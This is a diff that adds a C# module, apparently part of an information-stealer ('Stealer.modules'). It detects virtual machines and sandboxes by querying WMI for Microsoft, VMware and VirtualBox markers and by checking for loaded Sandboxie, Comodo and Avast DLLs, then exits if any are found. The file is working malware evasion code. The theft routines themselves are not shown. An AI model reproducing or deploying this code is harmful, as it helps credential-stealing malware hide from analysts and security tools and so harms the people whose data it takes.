@@ -1,0 +1,45 @@
+﻿using System;
+using System.Management;
+using System.Runtime.InteropServices;
+
+namespace Stealer.modules
+{
+    internal class VirtualMachine
+    {
+        public static void CheckVM()
+        {
+            if (DetectVM() == true)
+            {
+                Environment.Exit(0);
+            }
+        }
+        private static bool DetectVM()
+        {
+            try
+            {
+                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+                {
+                    using (var items = searcher.Get())
+                    {
+                        foreach (var item in items)
+                        {
+                            string manufacturer = item["Manufacturer"].ToString().ToLower();
+                            if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                                || manufacturer.Contains("vmware")
+                                || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
+                                || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
+                                GetModuleHandle("snxhk.dll").ToInt32() != 0)
+                            {
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string running);
+    }
+}
